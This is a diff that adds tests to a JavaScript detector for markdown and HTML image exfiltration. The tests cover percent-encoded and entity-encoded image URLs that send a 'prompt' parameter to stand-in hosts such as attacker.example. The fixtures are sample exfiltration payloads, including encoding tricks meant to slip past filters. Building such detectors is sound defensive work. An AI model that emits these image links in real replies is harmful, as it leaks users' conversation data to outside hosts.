@@ -319,6 +319,75 @@ add('23 v1.13.0: &amp;-joined params on i.imgur.com -> SAFE (host short-circuit 
   zero('<img src="https://i.imgur.com/abc.png?session=A&amp;chat=B&amp;context=C">');
 });
 
+// --- v1.15.0 Theme B: percent-decoded URL pre-pass ---
+//
+// classifyUrl() now runs a minimal percent-decode (6-char allowlist) when raw
+// classification misses, and marks the verdict with meta.percentDecoded=true.
+// Applies to all 3 image shapes. Composable with v1.13.0 entity-decode on
+// the html-img path.
+
+add('24 v1.15.0: %26-encoded strong key on unknown host -> DANGER (percentDecoded=true)', () => {
+  // Raw `?a=A%26prompt=B`: URLSearchParams sees key "a" with value
+  // "A&prompt=B" (literal `%26` becomes `&` only inside the value, the
+  // separator stays "&" so there's only one key). 0 strong / 0 weak -> raw
+  // miss. Percent-decode: `%26`->`&` -> 2 keys, `prompt` strong -> danger.
+  const f = one('![x](http://attacker.example/p?a=A%26prompt=PAYLOAD)');
+  if (f.severity !== 'danger') throw new Error(`severity=${f.severity}`);
+  if (f.technique !== 'Markdown image exfiltration (strong key)') {
+    throw new Error(`technique=${f.technique}`);
+  }
+  if (f.meta.host !== 'attacker.example') throw new Error(`meta.host=${f.meta.host}`);
+  if (f.meta.matchedKey !== 'prompt') throw new Error(`meta.matchedKey=${f.meta.matchedKey}`);
+  if (f.meta.percentDecoded !== true) throw new Error(`meta.percentDecoded=${f.meta.percentDecoded}`);
+});
+
+add('25 v1.15.0: %25 (encoded percent) NOT double-decoded -> SAFE', () => {
+  // %25 is EXCLUDED from the allowlist to prevent double-decode bypass.
+  // `?%2525prompt=X`: raw key is "%2525prompt" (since URLSearchParams
+  // decodes %25->% giving "%25prompt"... actually let's keep simpler: the
+  // allowlist contains NO entries that would expose `prompt` here, so
+  // staying silent is the contract.
+  zero('![x](http://attacker.example/p?%2525prompt=X)');
+});
+
+add('26 v1.15.0: combined entity + percent encoding on html-img -> BOTH flags set', () => {
+  // Double-obfuscation: html-img raw misses (entity-encoded protocol);
+  // entity-decoded form passes through classifyUrl() which runs the
+  // percent-decode 2-pass. Final meta carries entityDecoded AND
+  // percentDecoded. Pins the composability contract on the Web side.
+  const f = one('<img src=&quot;http://attacker.example/p?a=A%26prompt=PAYLOAD&quot;>');
+  if (f.severity !== 'danger') throw new Error(`severity=${f.severity}`);
+  if (f.technique !== 'Markdown image exfiltration (strong key)') {
+    throw new Error(`technique=${f.technique}`);
+  }
+  if (f.meta.matchedKey !== 'prompt') throw new Error(`meta.matchedKey=${f.meta.matchedKey}`);
+  if (f.meta.entityDecoded !== true) throw new Error(`meta.entityDecoded=${f.meta.entityDecoded}`);
+  if (f.meta.percentDecoded !== true) throw new Error(`meta.percentDecoded=${f.meta.percentDecoded}`);
+});
+
+add('27 v1.15.0: R12 — technique stays fixed-phrase; decoded URL never in technique/content', () => {
+  // Even on the percent-decoded path, technique is one of 4 fixed phrases
+  // and content echoes the RAW (still-encoded) URL — NOT the decoded form.
+  const md = '![x](http://evil-pct.example/c?a=A%26prompt=PAYLOAD-LEAK)';
+  const f = one(md);
+  if (f.technique.includes('evil-pct.example')) {
+    throw new Error('technique leaks host');
+  }
+  if (f.technique.includes('PAYLOAD-LEAK')) {
+    throw new Error('technique leaks value');
+  }
+  if (f.technique.includes('prompt')) {
+    throw new Error('technique leaks key name');
+  }
+  if (f.technique.includes('%26')) {
+    throw new Error('technique leaks raw encoding');
+  }
+  if (f.meta.percentDecoded !== true) throw new Error(`meta.percentDecoded=${f.meta.percentDecoded}`);
+  // R13: content echoes the RAW (encoded) URL — decoded form never reaches it.
+  if (!f.content.includes('%26')) throw new Error('content lost raw encoding');
+  if (f.content.includes('a=A&prompt')) throw new Error('content leaked decoded URL');
+});
+
 // ---- Runner ----
 
 let passed = 0;
